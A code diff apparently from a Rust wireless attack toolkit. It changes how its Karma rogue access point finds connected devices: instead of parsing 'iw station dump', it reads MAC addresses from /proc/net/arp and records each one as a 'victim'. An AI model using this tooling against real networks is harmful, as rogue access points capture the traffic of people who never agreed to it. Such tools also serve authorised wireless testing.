@@ -32,6 +32,33 @@ use crate::netlink_helpers::{
 use crate::probe::ProbeSniffer;
 use crate::process_helpers::pkill_exact_force;
 
+fn arp_clients(interface: &str) -> Vec<String> {
+    let mut clients = Vec::new();
+    let mut seen = std::collections::HashSet::new();
+    if let Ok(contents) = fs::read_to_string("/proc/net/arp") {
+        for (idx, line) in contents.lines().enumerate() {
+            if idx == 0 {
+                continue;
+            }
+            let parts: Vec<&str> = line.split_whitespace().collect();
+            if parts.len() < 6 {
+                continue;
+            }
+            if parts[5] != interface {
+                continue;
+            }
+            let mac = parts[3];
+            if mac == "00:00:00:00:00:00" {
+                continue;
+            }
+            if seen.insert(mac.to_string()) {
+                clients.push(mac.to_string());
+            }
+        }
+    }
+    clients
+}
+
 /// Karma attack configuration
 #[derive(Debug, Clone)]
 pub struct KarmaConfig {
@@ -784,24 +811,11 @@ where
     while start.elapsed() < duration && attack.is_running() {
         thread::sleep(Duration::from_secs(5));
 
-        // Check connected clients
-        if let Ok(output) = Command::new("iw")
-            .args(["dev", ap_interface, "station", "dump"])
-            .output()
-        {
-            let stdout = String::from_utf8_lossy(&output.stdout);
-            let client_count = stdout.matches("Station").count();
-            if client_count > 0 {
-                progress(&format!("Karma AP: {} clients connected", client_count));
-
-                // Record as victims
-                for line in stdout.lines() {
-                    if line.contains("Station") {
-                        if let Some(mac) = line.split_whitespace().nth(1) {
-                            attack.record_victim(mac, &primary_ssid, None);
-                        }
-                    }
-                }
+        let clients = arp_clients(ap_interface);
+        if !clients.is_empty() {
+            progress(&format!("Karma AP: {} clients connected", clients.len()));
+            for mac in clients {
+                attack.record_victim(&mac, &primary_ssid, None);
             }
         }
     }
